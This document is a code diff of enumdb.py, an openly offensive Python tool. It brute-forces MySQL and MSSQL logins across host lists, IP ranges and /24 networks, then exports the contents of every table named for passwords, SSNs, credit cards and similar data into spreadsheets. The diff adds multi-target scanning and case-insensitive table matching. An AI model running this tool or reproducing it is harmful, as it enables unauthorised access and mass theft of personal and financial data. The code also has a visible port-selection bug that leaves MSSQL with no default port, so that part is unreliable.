@@ -1,45 +1,19 @@
 #!/usr/bin/env python3
 
 # Author: m8r0wn
-# Script: enumdb.py
+# License: GPL-3.0
 
 # Disclaimer:
 # This tool was designed to be used only with proper
 # consent. Use at your own risk.
 
+import argparse
 import MySQLdb
 import pymssql
-import openpyxl
-import sys
-import os
-
-def banner():
-    print("""
-                        enumdb.py
-       -----------------------------------------
-Brute force MySQL or MSSQL database logins. Once provided with valid
-credentials, enumdb will attempt to enumerate tables containing
-sensitive information such as: users, passwords, ssn, etc.
-
-Options:
-    -u          Username value
-    -U          user.txt file
-
-    -p          Password value
-    -P          Pass.txt file
-
-    -t         Database type: mssql, mysql
-    -port      Specify Non-standard port
-
-    -brute     Brute force only, do not enumerate
-    -csv       CSV output file (default: xlsx)
-
-python3 enumdb.py -u root -p '' -t mysql 10.11.1.30
-python3 enumdb.py -u 'domain\\user1 -P pass.txt -t mssql 192.168.1.7
-
-Having trouble with inputs? Use '' around username & password
-    """)
-    sys.exit(0)
+import re
+from openpyxl import Workbook
+from sys import exit, argv
+from os import path, remove
 
 class create_xlsx():
     def __init__(self, outfile, host, dbtype):
@@ -48,7 +22,7 @@ class create_xlsx():
         self.create_overview(host, dbtype)
 
     def create_workbook(self):
-        self.wb = openpyxl.Workbook()
+        self.wb = Workbook()
 
     def save_workbook(self, filename):
         self.wb.save(filename)  # save new workbook
@@ -101,18 +75,6 @@ class enum_db():
                  'credit_cards', 'creditcards','credit cards',
                  'social', 'socials']
 
-    def __init__(self):
-        self.generate_searchwords()
-
-    def generate_searchwords(self):
-        #create variations of lower case table names
-        count = 0
-        list_len = len(self.search_tables)
-        while count != list_len:
-            self.search_tables.append(self.search_tables[count].title())
-            self.search_tables.append(self.search_tables[count].upper())
-            count += 1
-
     def db_connect(self, dbtype, host, port, user, passwd):
         try:
             if dbtype == "mysql":
@@ -120,10 +82,10 @@ class enum_db():
                 con.query_timeout = 20
             elif dbtype == "mssql":
                 con = pymssql.connect(server=host, port=port, user=user, password=passwd, login_timeout=3, timeout=3)
-            print_success("Connection Established {}:{}@{}".format(user,passwd,host))
+            print_success("Connection established {}:{}@{}".format(user,passwd,host))
             return con
         except:
-            print_failure("Login to {}:{}@{} failed.".format(user,passwd,host))
+            print_failure("Login failed {}:{}@{}".format(user,passwd,host))
             return False
 
     def db_query(self,con, cmd):
@@ -137,9 +99,7 @@ class enum_db():
         if count > 0:
             print_status("{} tables enumerated for {}".format(count, host))
         else:
-            print_failure("{} table(s) enumerated for {}".format(count, host))
-        print_status("Closing\n")
-        sys.exit(0)
+            print_failure("{} table(s) enumerated for {}\n".format(count, host))
 
     def mysql_enum(self, con, outfile, host, dbtype, excel):
         table_count = 0
@@ -148,7 +108,7 @@ class enum_db():
             for table in self.db_query(con, "show tables;"):
                 complete_tables = []
                 for t in self.search_tables:
-                    if t in table[0] and table[0] not in complete_tables:
+                    if t in table[0].lower() and table[0] not in complete_tables:
                         complete_tables.append(table[0])
                         header = self.db_query(con, "SHOW COLUMNS FROM {}".format(table[0]))
                         data = self.db_query(con, "SELECT * FROM {}".format(table[0]))
@@ -174,7 +134,7 @@ class enum_db():
             for table in self.db_query(con, "SELECT NAME FROM {}.sys.tables;".format(database[0])):
                 complete_tables = []
                 for t in self.search_tables:
-                    if t in table[0] and table[0] not in complete_tables:
+                    if t in table[0].lower() and table[0] not in complete_tables:
                         complete_tables.append(table[0])
                         header = self.db_query(con, "USE {};SELECT column_name FROM information_schema.columns WHERE table_name = '{}';".format(database[0],table[0]))
                         data = self.db_query(con, "SELECT * FROM {}.dbo.{};".format(database[0],table[0]))
@@ -182,7 +142,7 @@ class enum_db():
                             if table_count == 0:
                                 #Create xlsx workbook on first found data
                                 xlsx = create_xlsx(outfile, host, dbtype)
-                            print_success("Enumerating {}:{}".format(database[0], table[0]))
+                            print_success("Enumerating {}:{} @  {}".format(database[0], table[0], host))
                             xlsx.addto_overview(database[0], table[0], t)
                             xlsx.create_sheet(database[0], table[0], header, data)
                             table_count += 1
@@ -190,7 +150,7 @@ class enum_db():
                             write_csv(outfile, header, data, database[0], table[0])
                             table_count += 1
                         else:
-                            print_empty('Empty data set {}:{}'.format(database[0], table[0]))
+                            print_empty('Empty data set {}:{} @ {}'.format(database[0], table[0], host))
         con.close()
         self.db_closing(table_count, host)
 
@@ -211,16 +171,16 @@ def write_csv(outfile, header, data, database, table):
 
 def outfile_prep(file):
     #check if file exists and prompt user to delete
-    if os.path.exists(file):
+    if path.exists(file):
         print("\n");print_failure("Output file '{}' exists in current directory.".format(file))
         delete_old = input("\033[1;34m[*]\033[1;m Do you want to delete and continue? [y/N]: ")
         if delete_old not in ['y', 'Y']:
-            sys.exit(0)
-        os.remove(file)
+            exit(0)
+        remove(file)
     return file
 
 def write_file(file, data):
-    if os.path.exists(file):
+    if path.exists(file):
         option = 'a'
     else:
         option = 'w'
@@ -241,70 +201,126 @@ def print_empty(msg):
     print('\033[1;33m[-]\033[1;m', msg)
 
 def get_val(flag):
-    return sys.argv[sys.argv.index(flag) + 1]
+    return argv[argv.index(flag) + 1]
 
-def parse_args():
-    args = {}
+def file_exists(parser, filename, rtnlist):
+    #used with argparse to check file name exists
+    if not path.exists(filename):
+        parser.error("Input file not found: {}".format(filename))
+    if rtnlist == 'list':
+        return [x.strip() for x in open(filename)]
+    else:
+        return filename
+
+def list_targets(t):
+    hosts = []
+    ip = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
+    iprange = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\-\d{1,3}$")
+    dns = re.compile("^.+\.[a-z|A-Z]{2,}$")
+    cidr = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/24$")
     try:
-        #host
-        args['host'] = sys.argv[-1]
-        #Username
-        try:
-            args['users'] = [line.strip() for line in open(get_val('-U'))]
-        except:
-            args['users'] = [get_val('-u')]
-        #Password
-        try:
-            args['passwd'] = [line.strip() for line in open(get_val('-P'))]
-        except:
-            args['passwd'] = [get_val('-p')]
-        #dbtype
-        args['dbtype'] = get_val('-t')
-        #port
-        try:
-            args['port'] = int(get_val("-P"))
-        except:
-            if args['dbtype'] == 'mysql':
-                args['port'] = 3306
-            elif args['dbtype'] == 'mssql':
-                args['port'] = 1433
-        #brute option
-        args['enum'] = True
-        if '-brute' in sys.argv:
-            args['enum'] = False
-        #output type
-        args['excel'] = True
-        args['file_ext'] = 'xlsx'
-        if '-csv' in sys.argv:
-            args['excel'] = False
-            args['file_ext'] = 'csv'
-        return args
+        #txt File
+        if t.endswith(".txt"):
+            if path.exists(t):
+                return [ip.strip() for ip in open(t)]
+            else:
+                raise Exception("001: host file not found")
+        #multiple 127.0.0.1,yahoo.com
+        elif "," in t:
+            for x in t.split(","):
+                hosts.append(x)
+        #Cidr /24
+        elif cidr.match(t):
+            a = t.split("/")[0].split(".")
+            for x in range(0, 256):
+                target = a[0] + "." + a[1] + "." + a[2] + "." + str(x)
+                hosts.append(target)
+        #Range 127.0.0.1-50
+        elif iprange.match(t):
+            a,b = t.split("-")
+            c = a.split(".")
+            for x in range(int(c[2]), int(b)+1):
+                hosts.append(c[0]+"."+c[1]+"."+c[2]+"."+str(x))
+        #Single IP match
+        elif ip.match(t):
+            hosts.append(t)
+        #Dns name
+        elif dns.match(t):
+            hosts.append(t)
+        #no match
+        else:
+            raise Exception("002: invalid target provided")
+        return hosts
     except Exception as e:
-        print_failure("Error parsing user input: {}".format(e))
-        sys.exit(0)
+        print("[!] List_Target Error " + str(e))
+        exit(1)
 
-def main():
-    if "-h" in sys.argv or len(sys.argv) == 1:
-        banner()
+def default_port(db):
+    if db == "mysql":
+        return 3306
+    elif db == "mysql":
+        return 1433
+
+def file_ext(excel):
+    if not excel:
+        return "csv"
+    else:
+        return "xlsx"
+
+def main(args, targets):
     try:
-        args = parse_args()
-        print_status("Starting enumdb.py")
+        print_status("Starting enumdb.py\n"+"-"*25)
         scan = enum_db()
-        for user in args['users']:
-            for passwd in args['passwd']:
-                con = scan.db_connect(args['dbtype'], args['host'], args['port'], user, passwd)
-                if con and args['enum']:
-                    if args['dbtype'] == "mysql":
-                        scan.mysql_enum(con, outfile_prep("{}_enumdb.{}".format(args['host'], args['file_ext'])), args['host'], args['dbtype'], args['excel'])
-                    elif args['dbtype'] == 'mssql':
-                        scan.mssql_enum(con, outfile_prep("{}_enumdb.{}".format(args['host'], args['file_ext'])), args['host'], args['dbtype'], args['excel'])
+        for t in targets:
+            #One output file per target will be created
+            for user in args.users:
+                for passwd in args.password:
+                    con = scan.db_connect(args.dbtype, t, args.port, user, passwd)
+                    if con and not args.brute:
+                        if args.dbtype == "mysql":
+                            scan.mysql_enum(con, outfile_prep("{}_enumdb.{}".format(t[-6:], file_ext(args.excel))), t, args.dbtype, args.excel)
+                        elif args.dbtype == 'mssql':
+                            scan.mssql_enum(con, outfile_prep("{}_enumdb.{}".format(t[-6:], file_ext(args.excel))), t, args.dbtype, args.excel)
     except KeyboardInterrupt:
         print("\n[!] Key Event Detected...\n\n")
-        sys.exit(0)
+        exit(0)
 
 if __name__ == '__main__':
+    version = "1.1"
     try:
-        main()
+        args = argparse.ArgumentParser(description="""
+                   {0}   v.{1}
+    --------------------------------------------------
+Brute force MySQL or MSSQL database logins. Once provided with valid
+credentials, enumdb will attempt to enumerate tables containing
+sensitive information such as: users, passwords, ssn, etc.
+
+** Having trouble with inputs? Use '' around username & password **
+
+Usage:
+    python3 enumdb.py -u root -p Password1 -t mysql 10.11.1.30
+    python3 enumdb.py -u root -p '' -t mysql -brute 10.0.0.0-50
+    python3 enumdb.py -u 'domain\\user1 -P pass.txt -t mssql 192.168.1.7""".format(argv[0], version), formatter_class=argparse.RawTextHelpFormatter, usage=argparse.SUPPRESS)
+        user = args.add_mutually_exclusive_group(required=True)
+        user.add_argument('-u', dest='users', type=str, action='append', help='Single username, OR')
+        user.add_argument('-U', dest='users', default=False, type=lambda x: file_exists(args, x, 'list'), help='Users.txt file')
+        passwd = args.add_mutually_exclusive_group(required=True)
+        passwd.add_argument('-p', dest='password', action='append', default=[], help='Single password, OR')
+        passwd.add_argument('-P', dest='password', default=False, type=lambda x: file_exists(args, x, 'list'), help='Password.txt file')
+
+        args.add_argument('-t', dest='dbtype', type=str, required=True, help='Database types: mssql, mysql')
+        args.add_argument('-port', dest='port', type=int, default=0, help='Specify Non-standard port')
+        args.add_argument('-csv', dest="excel", action='store_false', help='CSV output file (Default: xlsx)')
+        args.add_argument('-brute', dest="brute", action='store_true', help='Brute force only, do not enumerate')
+
+        args.add_argument(dest='targets', nargs='+', help='Target database server(s)')
+        args = args.parse_args()
+
+        #Define default port based on dbtype
+        if args.port == 0: args.port = default_port(args.dbtype)
+
+        #Launch Main
+        main(args, list_targets(args.targets[0]))
     except KeyboardInterrupt:
         print("\n[!] Key Event Detected...\n\n")
-        sys.exit(0)
+        exit(0)
